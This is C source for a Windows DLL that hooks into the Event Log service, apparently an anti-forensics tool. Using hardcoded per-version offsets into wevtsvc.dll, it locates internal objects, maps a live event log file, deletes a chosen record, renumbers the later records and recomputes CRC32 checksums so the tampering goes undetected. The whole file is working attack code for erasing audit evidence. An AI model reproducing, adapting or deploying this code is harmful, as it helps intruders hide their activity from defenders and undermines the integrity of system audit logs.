#include <windows.h>
#include <VersionHelpers.h>
#include "EventLogEditDll.h"
#include "Common.h"

#define LIBAPI extern "C" __declspec(dllexport)
#define OFFSET_BLOCK_COUNT 6

#ifdef _WIN64
OFFSETBLOCK OffsetBlockArray[OFFSET_BLOCK_COUNT] =
{
	{ 0x00060000, 0x17704002, 0xc59cc, 0x7a4ab, 0xbc7c8, 0xbd500, 0xc0268, 0xbd71c, 0xc012c, 0x58, 0x18, 0x98, 0xc0, 0x308, 0x330, 0x38c, 0x0 },
	{ 0x00060000, 0x17714650, 0xca7a0, 0x7ea29, 0xc1470, 0xc214c, 0xc4f00, 0xc2368, 0xc4dc4, 0x58, 0x18, 0x98, 0xc0, 0x308, 0x330, 0x38c, 0x0 },
	{ 0x00060000, 0x17724655, 0xcab44, 0x7f385, 0xc1884, 0xc2560, 0xc5314, 0xc277c, 0xc51d8, 0x58, 0x18, 0x98, 0xc0, 0x308, 0x330, 0x38c, 0x0 },
	{ 0x00060001, 0x1db04001, 0x7908, 0x3036a, 0x18ea0, 0x7248, 0xa14f4, 0x1d504, 0xa13e0, 0x58, 0x18, 0xb0, 0xd8, 0x328, 0x350, 0x3ac, 0x0 },
	{ 0x00060001, 0x1db1446a, 0x74a0, 0x36e3a, 0x1695c, 0x4cb4, 0xa0a80, 0x2645c, 0xa0968, 0x58, 0x18, 0xb0, 0xd8, 0x328, 0x350, 0x3ac, 0x0 },
	{ 0x00060002, 0x23f04000, 0x10e0, 0x5a249, 0x17a40, 0x61d0, 0x92618, 0x1a0f0, 0x91d3c, 0x58, 0x18, 0xb0, 0xd8, 0x330, 0x358, 0x3b4, 0x0 }
};

ULONG UnknownArray1[] = { 0xc8, 0x00, 0xcc, 0x00, 0xdc, 0x00, 0xe0, 0x00, 0x120, 0xffffffff,  0x124, 0xffffffff, 0x364, 0x00, 0x370, 0x00 };
ULONG UnknownArray2[] = { 0x18, 0x00, 0xe0, 0x00, 0xe4, 0x00, 0x100, 0x00, 0x104, 0x00, 0x140, 0xffffffff, 0x144, 0xffffffff, 0x384, 0x00, 0x390, 0x00, 0x3b0, 0x00 };
ULONG UnknownArray3[] = { 0x18, 0x00, 0xe0, 0x00, 0x108, 0x00, 0x10c, 0x00, 0x148, 0xffffffff, 0x14c, 0xffffffff, 0x38c, 0x00, 0x3b8, 0x00, 0x00, 0x00 };

#else
OFFSETBLOCK OffsetBlockArray[OFFSET_BLOCK_COUNT] =
{
	{ 0x00060000, 0x17704002, 0x1bf0, 0x28ca5, 0x14d94, 0x6eee, 0xa273e, 0x176df, 0x5c38, 0x30, 0x0c, 0x98, 0xb0, 0x2c4, 0x2e0, 0x328, 0x0 },
	{ 0x00060000, 0x17714650, 0x192a, 0x12793, 0x18258, 0x6d3a, 0x2674b, 0x21149, 0x49a7, 0x30, 0x0c, 0x98, 0xb0, 0x2c4, 0x2e0, 0x328, 0x0 },
	{ 0x00060000, 0x17724655, 0x19ae, 0x2cad1, 0x13f8b, 0x79c1, 0x35e3b, 0x20357, 0x52bd, 0x30, 0x0c, 0x98, 0xb0, 0x2c4, 0x2e0, 0x328, 0x0 },
	{ 0x00060001, 0x1db04001, 0x6f63, 0x389f3, 0x183fc, 0x6d5f, 0xac185, 0x32342, 0xabfc7, 0x30, 0x0c, 0xa8, 0xc0, 0x2d4, 0x2f8, 0x340, 0x0 },
	{ 0x00060001, 0x1db1446a, 0x6f93, 0x22803, 0x18b25, 0x6522, 0xac24d, 0x2caaa, 0xac09b, 0x30, 0x0c, 0xa8, 0xc0, 0x2d4, 0x2f8, 0x340, 0x0 },
	{ 0x00060002, 0x23f04000, 0x7742f, 0x9f745, 0x5d354, 0x58405, 0x762e6, 0x77607, 0xc47e1, 0x30, 0x0c, 0xa8, 0xc0, 0x2e4, 0x300, 0x334, 0x1 }
};

ULONG UnknownArray1[] = { 0xb4, 0x00, 0xb8, 0x00, 0xc8, 0x00, 0xcc, 0x00, 0x100, 0xffffffff, 0x104, 0xffffffff, 0x308, 0x00, 0x314, 0x00 };
ULONG UnknownArray2[] = { 0x10, 0x00, 0xc4, 0x00, 0xc8, 0x00, 0xdc, 0x00, 0xe0, 0x00, 0x118, 0xffffffff, 0x11c, 0xffffffff, 0x320, 0x00, 0x32c, 0x00, 0x344, 0x00 };
ULONG UnknownArray3[] = { 0x01, 0x00, 0x34, 0x00, 0xc4, 0x00, 0xc8, 0x00, 0xe4, 0x00, 0xe8, 0x00, 0x120, 0xffffffff, 0x124, 0xffffffff, 0x328, 0x00, 0x334, 0x00 };

#endif

EVENT_FILE_FULLFLUSH Event_File_FullFlush = NULL;//public: void File::FullFlush(enum  FlushType)
FILE_NOTIFYREADERS File_NotifyReaders = NULL;//private: void File::NotifyReaders(enum  NotifyAction)
FILE_READFILEHEADER File_ReadFileHeader = NULL;//File::ReadFileHeader(File *this)
UPDATECRC32 UpdateCRC32 = NULL;//unsigned int __fastcall UpdateCRC32(const unsigned __int8 *, int, unsigned int)

POFFSETBLOCK OffsetBlock = NULL;
PVOID UnknownObject = NULL;

BOOL GetOffsetBlock()
{
	typedef BOOL(WINAPI *VERQUERYVALUEW)(LPCVOID, PCWSTR, LPVOID *, PUINT);
	typedef BOOL(WINAPI *GETFILEVERSIONINFOW)(PCWSTR, DWORD, DWORD, LPVOID);
	typedef DWORD(WINAPI *GETFILEVERSIONINFOSIZEW)(PCWSTR, LPDWORD);

	BOOL result = FALSE;
	HMODULE versionModule = LoadLibrary(TEXT("Version.dll"));
	if (versionModule)
	{
		VERQUERYVALUEW funcVerQueryValueW = (VERQUERYVALUEW)
			GetProcAddress(versionModule, "VerQueryValueW");
		GETFILEVERSIONINFOW funcGetFileVersionInfoW = (GETFILEVERSIONINFOW)
			GetProcAddress(versionModule, "GetFileVersionInfoW");
		GETFILEVERSIONINFOSIZEW funcGetFileVersionInfoSizeW = (GETFILEVERSIONINFOSIZEW)
			GetProcAddress(versionModule, "GetFileVersionInfoSizeW");

		if (funcVerQueryValueW && funcGetFileVersionInfoW && funcGetFileVersionInfoSizeW)
		{
			DWORD verInfoSize = funcGetFileVersionInfoSizeW(L"wevtsvc.dll", NULL);
			if (verInfoSize)
			{
				PVOID verInfo = VirtualAlloc(NULL, verInfoSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

				if (verInfo)
				{
					if (funcGetFileVersionInfoW(L"wevtsvc.dll", 0, verInfoSize, verInfo))
					{
						VS_FIXEDFILEINFO *fileInfo = NULL;
						UINT len = 0;
						if (funcVerQueryValueW(verInfo, L"\\", (PVOID *)&fileInfo, &len))
						{
							if (fileInfo)
							{
								for (UINT i = 0; i < OFFSET_BLOCK_COUNT; i++)
								{
									if (fileInfo->dwFileVersionMS == OffsetBlockArray[i].FileVersionMS &&
										fileInfo->dwFileVersionLS == OffsetBlockArray[i].FileVersionLS)
									{
										OffsetBlock = &OffsetBlockArray[i];
										result = TRUE;
										break;
									}
								}
							}
						}
					}

					VirtualFree(verInfo, 0, MEM_RELEASE);
				}
			}
		}

		FreeLibrary(versionModule);
	}

	return result;
}

BOOL GetObjectFromOffset()
{
	BOOL result = FALSE;
	HMODULE wevtsvc = GetModuleHandle(TEXT("wevtsvc.dll"));
	PBYTE ptr_EventService_vftable = NULL;

	if (wevtsvc)
	{
		PBYTE ptr = (PBYTE)wevtsvc + OffsetBlock->Offset[1];//g_service@@3PEAVEventService@@EA
		DWORD v1 = 0;
		DWORD v2 = 0;

		do
		{
			v2 = v2 + (*ptr++ << v1);
			v1 += 8;
		} while (v1 < 0x20);
#ifdef _WIN64
		ptr_EventService_vftable = *(PBYTE *)(ptr + v2);
#else
		ptr_EventService_vftable = *(PBYTE *)v2;
#endif

		if (ptr_EventService_vftable)
		{
			Event_File_FullFlush = (EVENT_FILE_FULLFLUSH)((PBYTE)wevtsvc + OffsetBlock->Offset[4]);
			File_NotifyReaders = (FILE_NOTIFYREADERS)((PBYTE)wevtsvc + OffsetBlock->Offset[6]);
			File_ReadFileHeader = (FILE_READFILEHEADER)((PBYTE)wevtsvc + OffsetBlock->Offset[5]);
			UpdateCRC32 = (UPDATECRC32)((PBYTE)wevtsvc + OffsetBlock->Offset[0]);

			if (Event_File_FullFlush &&
				File_NotifyReaders &&
				File_ReadFileHeader &&
				UpdateCRC32)
			{
				ULONG_PTR v1 = *(PULONG_PTR)(ptr_EventService_vftable + OffsetBlock->Offset[7]);
				if (v1)
				{
					UnknownObject = (PVOID)(v1 + OffsetBlock->Offset[8]);
					result = UnknownObject == NULL ? FALSE : TRUE;
				}
			}
		}
	}

	return result;
}

PVOID GetUnknownObject(PCWSTR logName)
{
	PVOID retObject = NULL;
	PULONG_PTR ptr = (PULONG_PTR)UnknownObject;
	DWORD max = (*(ptr + 1) - *ptr) / sizeof(ULONG_PTR);

	if (max)
	{
		DWORD count = 0;
		PULONG_PTR objectTable = (PULONG_PTR)(*ptr);

		while (count < 0x3e8)
		{
			ULONG_PTR object = *objectTable;

			if (object)
			{
				ULONG_PTR str = object + OffsetBlock->Offset[12];
				if (str && *(PDWORD)(str + 16) >= 8)
					str = *(PULONG_PTR)str;
				PWSTR str1 = *(PWSTR *)(OffsetBlock->Offset[11] + object);

				if ((str && !_wcsicmp((PWSTR)str, logName)) ||
					(str1 && !_wcsicmp(str1, logName)))
				{
					retObject = (PVOID)object;
					break;
				}
			}

			objectTable++;
			count += 1;
		}
	}

	return retObject;
}

PVOID GetTemplateIdentifierPtr(PBYTE chunkPtr, PBYTE recordPtr, PULONG a3)
{
	if (recordPtr)
	{
		PBYTE xmlDataPtr = recordPtr + 24;

		if (0x1010f != *(PULONG)xmlDataPtr)
		{
			while (0x0b == *xmlDataPtr)
				xmlDataPtr += 2 * *(PWORD)(xmlDataPtr + 1) + 3;
		}

		PBYTE templateInstance = NULL;
		if (0x0c == *(xmlDataPtr + 4))
			templateInstance = xmlDataPtr + 4;
		if (templateInstance)
		{
			PBYTE v8 = NULL;

			if ((ULONG_PTR)templateInstance - (ULONG_PTR)chunkPtr + 10 ==
				*(PULONG)(templateInstance + 6))
			{
				v8 = templateInstance + 14;
			}
			else
			{
				ULONG templateDefinitionOffset = *(PULONG)(templateInstance + 6);
				ULONG tmp = (ULONG)(recordPtr - chunkPtr);
				if (templateDefinitionOffset < tmp || templateDefinitionOffset > tmp + *(PULONG)(recordPtr + 4))
					goto LABEL;
				v8 = templateDefinitionOffset + chunkPtr + 4;
			}
			if (v8)
			{
				if (*(PULONG)v8 == *(PULONG)(templateInstance + 2))
				{
					ULONG tmp = *(PULONG)(v8 + 16);
					*a3 = *(PULONG)(tmp + v8 + 20);
					return tmp + v8 + 24;
				}
				return NULL;
			}
		LABEL:
			*a3 = *(PULONG)(templateInstance + 10);
			return templateInstance + 14;
		}
	}

	return NULL;
}

PVOID ModifyRecordNumber(PBYTE chunkPtr, PEVENT_RECORD recordPtr, ULONG64 eventRecordIdentifier)
{
	ULONG v9 = 0;
	PWORD templateIdentifierPtr = (PWORD)GetTemplateIdentifierPtr(chunkPtr, (PBYTE)recordPtr, &v9);

	if (templateIdentifierPtr)
	{
		ULONG count = 10;
		PULONG64 v7 = (PULONG64)&templateIdentifierPtr[2 * v9];

		do
		{
			WORD v8 = *templateIdentifierPtr;
			templateIdentifierPtr += 2;
			v7 = (PULONG64)((PBYTE)v7 + v8);
			--count;
		} while (count);
		*v7 = eventRecordIdentifier;
		recordPtr->EventRecordIdentifier = eventRecordIdentifier;
	}

	return templateIdentifierPtr;
}

PVOID GetTemplateInstancePtr(PBYTE recordPtr)
{
	PBYTE result = NULL;
	
	if (recordPtr)
	{
		PBYTE xmlDataPtr = recordPtr + 24;

		if (0x1010f != *(PULONG)(recordPtr + 24))
		{
			while (0xb == *xmlDataPtr)
				xmlDataPtr += 2 * *(PWORD)(xmlDataPtr + 1) + 3;
		}
		if (0x0c == *(xmlDataPtr + 4))
			result = xmlDataPtr + 4;
	}

	return result;
}

PVOID GetTemplateDefinition(PBYTE chunkPtr, PEVENT_RECORD recordPtr, PBYTE templateInstancePtr)
{
	PBYTE result = NULL;

	do
	{
		if (!recordPtr || !templateInstancePtr)
			break;
		if ((ULONG_PTR)templateInstancePtr - (ULONG_PTR)chunkPtr + 10 ==
			*(PULONG)(templateInstancePtr + 6))
			return templateInstancePtr + 14;

		ULONG templateDefinitionOffset = *(PULONG)(templateInstancePtr + 6);
		ULONG64 v6 = (ULONG64)((PBYTE)recordPtr - chunkPtr);
		if ((templateDefinitionOffset >= v6) &&
			(templateDefinitionOffset <= v6 + recordPtr->Size))
			result = templateDefinitionOffset + chunkPtr + 4;
	} while (FALSE);

	return result;
}

ULONG DeleteRecord(PVOID mapAddress, ULONG64 recordNumber)
{
	ULONG result = FAILURE;
	PELFFILE_HEADER elfFilePtr = (PELFFILE_HEADER)mapAddress;

	do
	{
		if (memcmp(mapAddress, "ElfFile", 8))
			break;
		
		ULONG crc32 = 0;
		BOOL unknownFlag = FALSE;
		BOOL deleted = FALSE;
		BOOL isSingleRecord = FALSE;
		ULONG64 chunkTotal = 0;
		ULONG64 chunkCount = 0;
		ULONG64 firstChunkNumber = elfFilePtr->FirstChunkNumber;
		ULONG64 lastChunkNumber = elfFilePtr->LastChunkNumber;
		ULONG numberOfChunk = elfFilePtr->NumberOfChunks;

		if (firstChunkNumber >= 0xffffffff || lastChunkNumber >= 0xffffffff)
			break;
		if (lastChunkNumber >= firstChunkNumber)
			chunkTotal = lastChunkNumber - firstChunkNumber + 1;
		else
			chunkTotal = lastChunkNumber + numberOfChunk - firstChunkNumber;

		*(PULONG)((PBYTE)elfFilePtr + 118) |= 1;

		while (chunkCount < chunkTotal)
		{
			ULONG64 chunkOffset = firstChunkNumber + chunkCount;
			if (chunkOffset > numberOfChunk)
				chunkOffset = chunkOffset - numberOfChunk;
			chunkOffset <<= 16;

			PCHUNK_HEADER currentChunk = (PCHUNK_HEADER)(chunkOffset + (PBYTE)elfFilePtr + 0x1000);
			if (0xffffffffffffffff != currentChunk->LastEventRecordIdentifier)
			{
				PEVENT_RECORD prevRecordPtr = NULL;
				PEVENT_RECORD currentRecordPtr = NULL;
				PEVENT_RECORD nextRecordPtr = (PEVENT_RECORD)((PBYTE)currentChunk + 0x200);
				
				while (nextRecordPtr)
				{
					prevRecordPtr = currentRecordPtr;
					currentRecordPtr = nextRecordPtr;
					nextRecordPtr = (PEVENT_RECORD)((PBYTE)nextRecordPtr + nextRecordPtr->Size);

					if (0x00002a2a != currentRecordPtr->Signature)
						break;

					ULONG64 eventRecordIdentifier = currentRecordPtr->EventRecordIdentifier;
					if ((eventRecordIdentifier >= currentChunk->LastEventRecordIdentifier) ||
						(currentRecordPtr == nextRecordPtr))
						nextRecordPtr = NULL;

					if (eventRecordIdentifier >= recordNumber)
					{
						if (eventRecordIdentifier > recordNumber || deleted)
						{
							if (deleted)
							{
								ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, eventRecordIdentifier - 1);
							}
						}
						else
						{
							if (!nextRecordPtr && !prevRecordPtr)
							{
								currentChunk->FirstEventRecordNumber = 1;
								currentChunk->LastEventRecordNumber = 0xffffffffffffffff;
								currentChunk->FirstEventRecorIdentifier = 0xffffffffffffffff;
								currentChunk->LastEventRecordIdentifier = 0xffffffffffffffff;
								currentChunk->LastEventRecordDataOffset = 0;
								currentChunk->FreeSpaceOffset = 512;
								memset((PBYTE)currentChunk + 128, 0, 0x180);
								isSingleRecord = TRUE;
								deleted = TRUE;
								result = SUCCESSED;
								break;
							}
							if (prevRecordPtr)
							{
								prevRecordPtr->Size += currentRecordPtr->Size;
								*(PULONG)(prevRecordPtr->Size + (PBYTE)prevRecordPtr - 4) = prevRecordPtr->Size;
								deleted = TRUE;
								result = SUCCESSED;
								currentRecordPtr = prevRecordPtr;
							}
							else
							{
								PBYTE xmlDataPtr = (PBYTE)currentRecordPtr + 24;
								PBYTE currentRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)currentRecordPtr);
								PBYTE nextRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)nextRecordPtr);
								*(PULONG)xmlDataPtr = 0x1010f;
								*(PWORD)(xmlDataPtr + 4) = 0x10c;

								if (currentRecordTemplateInstancePtr)
								{
									if (nextRecordPtr)
									{
										if (*(PULONG)(currentRecordTemplateInstancePtr + 6) == 
											*(PULONG)(nextRecordTemplateInstancePtr + 6))
										{
											ULONG a3 = 0;

											PBYTE templateIdentifierPtr = (PBYTE)GetTemplateIdentifierPtr((PBYTE)currentChunk, (PBYTE)nextRecordPtr, &a3);
											if (templateIdentifierPtr)
											{
												PBYTE templateDefinition = (PBYTE)GetTemplateDefinition((PBYTE)currentChunk,
													currentRecordPtr, 
													currentRecordTemplateInstancePtr);

												*(PULONG)(templateDefinition + 16) = templateIdentifierPtr - templateDefinition - 24;
												currentRecordPtr->Size += nextRecordPtr->Size;
												*(PULONG)(currentRecordPtr->Size + (PBYTE)currentRecordPtr - 4) = currentRecordPtr->Size;
												currentRecordPtr->WrittenDateAndTime = nextRecordPtr->WrittenDateAndTime;
												*(PULONG)(currentRecordTemplateInstancePtr + 10) = *(PULONG)(nextRecordTemplateInstancePtr + 10);

												ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, recordNumber);
												ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, recordNumber);

												deleted = TRUE;
												result = SUCCESSED;
											}
											else
											{
												ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, recordNumber);
												ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, recordNumber);

												currentRecordPtr->WrittenDateAndTime = nextRecordPtr->WrittenDateAndTime;
												*(PULONG64)(currentRecordTemplateInstancePtr + 10) =
													*(PULONG)(nextRecordTemplateInstancePtr + 10);
												*xmlDataPtr = 11;
												*(PWORD)(xmlDataPtr + 1) = 0;
												*(xmlDataPtr + 3) = 11;
												*(PWORD)(xmlDataPtr + 4) = ((ULONG64)(ULONG)((PBYTE)nextRecordPtr - (PBYTE)currentRecordPtr) - 6) >> 1;
												currentRecordPtr->Size += nextRecordPtr->Size;
												*(PULONG)(currentRecordPtr->Size + (PBYTE)currentRecordPtr - 4) = currentRecordPtr->Size;
												
												deleted = TRUE;
												result = SUCCESSED;
											}
										}

										nextRecordPtr = (PEVENT_RECORD)((PBYTE)currentRecordPtr + currentRecordPtr->Size);
									}
								}
							}
						}
					}
				}

				if (deleted)
				{
					ULONG64 lastEventRecordNumber = currentChunk->LastEventRecordNumber;
					ULONG64 lastEventRecordIdentifier = currentChunk->LastEventRecordIdentifier;

					if (0xffffffffffffffff != lastEventRecordNumber ||
						0xffffffffffffffff != lastEventRecordIdentifier)
					{
						ULONG64 firstEventRecordIdentifier = currentChunk->FirstEventRecorIdentifier;

						if (firstEventRecordIdentifier <= recordNumber && 
							lastEventRecordIdentifier >= recordNumber)
						{
							currentChunk->LastEventRecordNumber = lastEventRecordNumber - 1;
							currentChunk->LastEventRecordIdentifier = lastEventRecordIdentifier - 1;
						}
						else
						{
							currentChunk->FirstEventRecordNumber -= 1;
							currentChunk->LastEventRecordNumber = lastEventRecordNumber - 1;
							currentChunk->FirstEventRecorIdentifier = firstEventRecordIdentifier - 1;
							currentChunk->LastEventRecordIdentifier -= 1;
						}
					}
				}

				if (OffsetBlock->Offset[14])
				{
					crc32 = 0;
				}
				else
				{
					crc32 = UpdateCRC32((PBYTE)currentChunk + 512,
						currentChunk->FreeSpaceOffset - 512,
						0xffffffff);
				}
				if (crc32)
					currentChunk->EventRecordsChunksum = ~crc32;
				else
					unknownFlag = TRUE;

				if (OffsetBlock->Offset[14])
				{
					crc32 = 0;
				}
				else
				{
					crc32 = UpdateCRC32(currentChunk, 120, 0xffffffff);
					crc32 = UpdateCRC32((PBYTE)currentChunk + 128, 384, crc32);

				}
				currentChunk->Checksum = ~crc32;
			}

			chunkCount++;
		}

		if (isSingleRecord)
		{
			ULONG count = 0;

			while (count < chunkTotal)
			{
				PCHUNK_HEADER currentChunkPtr = NULL;
				PCHUNK_HEADER nextChunkPtr = NULL;
				ULONG64 tmp = firstChunkNumber + count;

				if (tmp > numberOfChunk)
					tmp -= numberOfChunk;
				currentChunkPtr = (PCHUNK_HEADER)((tmp << 16) + (PBYTE)elfFilePtr + 0x1000);
				if (++count < chunkTotal)
				{
					tmp = firstChunkNumber + count;
					if (tmp > numberOfChunk)
						tmp -= numberOfChunk;
					nextChunkPtr = (PCHUNK_HEADER)((tmp << 16) + (PBYTE)elfFilePtr + 0x1000);
				}

				if (0xffffffffffffffff == currentChunkPtr->LastEventRecordNumber &&
					0xffffffffffffffff == currentChunkPtr->LastEventRecordIdentifier)
				{
					if (nextChunkPtr)
					{
						memcpy(currentChunkPtr, nextChunkPtr, 0x10000);
						nextChunkPtr->FirstEventRecordNumber = 1;
						nextChunkPtr->LastEventRecordNumber = 0xffffffffffffffff;
						nextChunkPtr->FirstEventRecorIdentifier = 0xffffffffffffffff;
						nextChunkPtr->LastEventRecordIdentifier = 0xffffffffffffffff;
						nextChunkPtr->LastEventRecordDataOffset = 0;
						nextChunkPtr->FreeSpaceOffset = 512;
						memset((PBYTE)nextChunkPtr + 128, 0, 0x180);
					}
					else
					{
						if (lastChunkNumber)
							elfFilePtr->LastChunkNumber = lastChunkNumber - 1;
						else
							elfFilePtr->LastChunkNumber = numberOfChunk - 1;
					}
				}
			}
		}
		
		if (deleted)
			elfFilePtr->NextRecordIdentifier -= 1;

		crc32 = 0;
		if (0 == OffsetBlock->Offset[14])
			crc32 = UpdateCRC32(elfFilePtr, 118, 0xffffffff);
		elfFilePtr->Checksum = ~crc32;
		if (!unknownFlag)
			*(PULONG)((PBYTE)elfFilePtr + 118) &= 0xfffffffe;
	} while (FALSE);

	return result;
}

EXTERN_C ULONG X(PTARGET_RECORD param)
{
	ULONG result = FAILURE;

	if (0 == param->RecordNumber)
		return FAILURE_INVALID_RECORD;

	if (GetOffsetBlock())
	{
		HANDLE mapHandle = NULL;
		PVOID mapAddress = NULL;
		PVOID unknownObject = NULL;
		PCRITICAL_SECTION critic = NULL;

		do
		{
			if (!GetObjectFromOffset())
			{
				result = FAILURE_OBJECT_NOT_FOUND;
				break;
			}

			unknownObject = GetUnknownObject(param->EventLogName);
			if (!unknownObject)
			{
				result = FAILURE_OBJECT_NOT_FOUND;
				break;
			}
			
			critic = (PCRITICAL_SECTION)((PBYTE)unknownObject + OffsetBlock->Offset[9]);
			EnterCriticalSection(critic);

			CHAR flag;
			if (OffsetBlock->Offset[14])
			{
				flag = 0;
			}
			else
			{
				Event_File_FullFlush(unknownObject, 0);
				Event_File_FullFlush(unknownObject, 1);

				*(PDWORD)((PBYTE)unknownObject + OffsetBlock->Offset[13]) = 0;

				flag = 1;
			}

			if (flag)
			{
				HANDLE fileHandle = *(PHANDLE)((PBYTE)unknownObject + OffsetBlock->Offset[10]);
				if (fileHandle != INVALID_HANDLE_VALUE)
				{
					mapHandle = CreateFileMapping(fileHandle, NULL, PAGE_READWRITE, 0, 0, NULL);
					if (!mapHandle)
					{
						result = FAILURE_NOT_MAP_FILE;
						break;
					}

					mapAddress = MapViewOfFile(mapHandle, FILE_MAP_ALL_ACCESS, 0, 0, 0);
					if (!mapAddress)
					{
						result = FAILURE_NOT_MAP_FILE;
						break;
					}

					result = DeleteRecord(mapAddress, param->RecordNumber);
					FlushViewOfFile(mapAddress, 0);

					if (!OffsetBlock->Offset[14])
						File_ReadFileHeader(unknownObject);

					PULONG unknownArray = NULL;
					ULONG count = 0;
					if (IsWindowsVistaOrGreater())
					{
						if (IsWindowsVistaOrGreater() && !IsWindows7OrGreater())
						{
							unknownArray = UnknownArray1;
							count = sizeof(UnknownArray1) / sizeof(ULONG);
						}
						else if (IsWindows7OrGreater() && !IsWindows8OrGreater())
						{
							unknownArray = UnknownArray2;
							count = sizeof(UnknownArray2) / sizeof(ULONG);
						}
						else if (IsWindows8OrGreater() && !IsWindows8Point1OrGreater())
						{
							unknownArray = UnknownArray3;
							count = sizeof(UnknownArray3) / sizeof(ULONG);
						}

						for (ULONG i = 0; i < count; i += 2)
						{
							ULONG v = unknownArray[i];
							ULONG_PTR tmp = (ULONG_PTR)unknownObject + v;

							if (tmp & 3)
								continue;

							v = unknownArray[i + 1];
							*(PULONG)tmp = v;
						}
					}

					File_NotifyReaders(unknownObject, 2);
				}
				else
				{
					result = FAILURE_NOT_MAP_FILE;
					break;
				}
			}
			else
			{
				result = FAILURE;
				break;
			}
		} while (FALSE);

		if (mapAddress)
			UnmapViewOfFile(mapAddress);
		if (mapHandle)
			CloseHandle(mapHandle);
		if (critic)
			LeaveCriticalSection(critic);
	}

	return result;
}

BOOL WINAPI DllMain(HMODULE instance, DWORD reason, PVOID reserve)
{
	switch (reason)
	{
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}

	return TRUE;
}